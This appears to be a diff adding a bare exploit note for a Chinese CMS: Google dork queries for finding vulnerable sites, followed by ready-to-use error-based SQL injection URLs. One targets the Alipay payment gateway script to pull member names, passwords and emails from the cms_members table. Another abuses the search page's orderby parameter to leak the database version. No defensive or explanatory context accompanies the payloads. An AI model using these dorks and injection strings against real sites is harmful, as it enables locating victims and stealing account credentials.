@@ -1,0 +1,24 @@
+inurl:member/index.php?ugid31=51
+
+inurl:index.php?chid=1
+
+inurl:index.php?caid=1
+
+inurl:index.php?ccid=1
+
+inurl:archive.php?aid=1
+
+
+inurl:list.php?catid=1
+inurl:show.php?id=
+
+
+/include/paygate/alipay/pays.php?out_trade_no=22' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT concat(0x3a,mname,0x3a,password,0x3a,email,0x3a) from cms_members limit 0,1),FLOOR(RAND(0)*2))X FROM information_schema.tables GROUP BY X)a) AND'
+
+
+/search.php?chid=1&carsfullname=aa&searchmode=subject&orderby=aid%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&addno=0&ccid8=366
+
+/search.php?searchmode=subject&searchword=[%]&caid=0&chid=0&ccid4=0&indays=0&orderby=createdate&searchsubmit=1
+
+
+
